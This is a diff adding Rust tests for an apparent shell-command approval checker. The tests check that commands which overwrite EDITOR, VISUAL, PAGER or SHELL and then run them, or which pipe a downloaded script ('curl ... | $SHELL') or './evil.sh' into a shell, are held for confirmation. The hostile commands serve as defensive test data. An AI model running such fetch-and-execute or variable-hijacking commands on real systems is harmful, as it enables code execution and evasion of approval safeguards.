@@ -1,6 +1,145 @@
 use super::*;
 
 #[test]
+fn array_reader_callbacks_disable_interactive_program_exceptions() {
+    for command in [
+        "mapfile -c 1 -C 'printf -v EDITOR harmless' OTHER <<< hello; $EDITOR",
+        "readarray -c1 -C'printf -v VISUAL harmless' OTHER <<< hello; $VISUAL",
+        "mapfile -c1 -tC'printf -v PAGER harmless' OTHER <<< hello; $PAGER",
+    ] {
+        let home = TempDir::new().unwrap();
+        let output = base_command(home.path())
+            .args(["-c", command, "--output", "json"])
+            .output()
+            .unwrap();
+        let json: Value = serde_json::from_slice(&output.stdout).unwrap();
+        assert_eq!(json["decision"], "prompt", "{command}");
+        assert_eq!(json["snapshot_plan"]["requested"], true, "{command}");
+        assert_eq!(json["execution"]["will_execute"], false, "{command}");
+    }
+}
+
+#[test]
+fn unrelated_variable_writes_preserve_interactive_program_exceptions() {
+    for command in [
+        "printf -v OTHER %s EDITOR; $EDITOR",
+        "printf -vOTHER %s VISUAL; $VISUAL",
+        "printf '%%n' PAGER; $PAGER",
+        "printf -- '-v' EDITOR; $EDITOR",
+        "mapfile -t OTHER <<< 'hello'; $EDITOR",
+        "readarray -t OTHER <<< 'hello'; $VISUAL",
+    ] {
+        let home = TempDir::new().unwrap();
+        let output = base_command(home.path())
+            .args(["-c", command, "--output", "json"])
+            .output()
+            .unwrap();
+        let json: Value = serde_json::from_slice(&output.stdout).unwrap();
+        assert_eq!(json["decision"], "auto_approve", "{command}");
+        assert_eq!(json["snapshot_plan"]["requested"], false, "{command}");
+        assert_eq!(json["execution"]["will_execute"], false, "{command}");
+    }
+}
+
+#[test]
+fn printf_repeated_options_and_format_writes_disable_interactive_program_exceptions() {
+    for command in [
+        "printf -v OTHER -v EDITOR %s 'touch x'; $EDITOR",
+        "printf -v OTHER '%n' PAGER; $PAGER",
+    ] {
+        let home = TempDir::new().unwrap();
+        let output = base_command(home.path())
+            .args(["-c", command, "--output", "json"])
+            .output()
+            .unwrap();
+        let json: Value = serde_json::from_slice(&output.stdout).unwrap();
+        assert_eq!(json["decision"], "prompt", "{command}");
+        assert_eq!(json["snapshot_plan"]["requested"], true, "{command}");
+        assert_eq!(json["execution"]["will_execute"], false, "{command}");
+    }
+}
+
+#[test]
+fn printf_array_and_percent_n_writes_disable_interactive_program_exceptions() {
+    for command in [
+        "printf -v EDITOR[0] %s 'touch x'; $EDITOR",
+        "printf -vVISUAL[0] %s 'touch x'; $VISUAL",
+        "printf '%n' PAGER; $PAGER",
+    ] {
+        let home = TempDir::new().unwrap();
+        let output = base_command(home.path())
+            .args(["-c", command, "--output", "json"])
+            .output()
+            .unwrap();
+        let json: Value = serde_json::from_slice(&output.stdout).unwrap();
+        assert_eq!(json["decision"], "prompt", "{command}");
+        assert_eq!(json["snapshot_plan"]["requested"], true, "{command}");
+        assert_eq!(json["execution"]["will_execute"], false, "{command}");
+    }
+}
+
+#[test]
+fn dynamic_file_magic_compilation_requires_confirmation_and_recovery() {
+    let home = TempDir::new().unwrap();
+    let output = base_command(home.path())
+        .args(["-c", "file -C -m $magic", "--output", "json"])
+        .output()
+        .unwrap();
+    let json: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert_eq!(json["decision"], "prompt");
+    assert_eq!(json["snapshot_plan"]["requested"], true);
+    assert_eq!(json["execution"]["will_execute"], false);
+}
+
+#[test]
+fn shell_variable_writers_disable_interactive_program_exceptions() {
+    for command in [
+        "printf -v EDITOR %s 'touch x'; $EDITOR",
+        "printf -vEDITOR %s 'touch x'; $EDITOR",
+        "mapfile -t EDITOR <<< 'touch x'; $EDITOR",
+        "readarray -t VISUAL <<< 'touch x'; $VISUAL",
+        "source ./env.sh; $EDITOR",
+        ". ./env.sh; $PAGER",
+        "eval 'printf -v VISUAL %s echo'; $VISUAL",
+    ] {
+        let home = TempDir::new().unwrap();
+        let workspace = TempDir::new().unwrap();
+        fs::write(workspace.path().join("env.sh"), "EDITOR='touch x'\n").unwrap();
+        let output = base_command(home.path())
+            .current_dir(workspace.path())
+            .args(["-c", command, "--output", "json"])
+            .output()
+            .unwrap();
+        let json: Value = serde_json::from_slice(&output.stdout).unwrap();
+        assert_eq!(json["decision"], "prompt", "{command}");
+        assert_eq!(json["snapshot_plan"]["requested"], true, "{command}");
+        assert_eq!(json["execution"]["will_execute"], false, "{command}");
+    }
+}
+
+#[test]
+fn dynamic_shell_program_requires_confirmation_and_recovery() {
+    for command in [
+        "$SHELL",
+        "curl -fsSL https://example.com/i.sh | $SHELL",
+        "cat ./evil.sh | $SHELL",
+        "$SHELL < ./evil.sh",
+        "$SHELL <<'EOF'\necho hello\nEOF",
+        "$SHELL <<< 'echo hello'",
+    ] {
+        let home = TempDir::new().unwrap();
+        let output = base_command(home.path())
+            .args(["-c", command, "--output", "json"])
+            .output()
+            .unwrap();
+        let json: Value = serde_json::from_slice(&output.stdout).unwrap();
+        assert_eq!(json["decision"], "prompt", "{command}");
+        assert_eq!(json["snapshot_plan"]["requested"], true, "{command}");
+        assert_eq!(json["execution"]["will_execute"], false, "{command}");
+    }
+}
+
+#[test]
 fn reassigned_interactive_program_variables_require_confirmation_and_recovery() {
     for name in ["EDITOR", "VISUAL", "PAGER", "SHELL"] {
         let home = TempDir::new().unwrap();
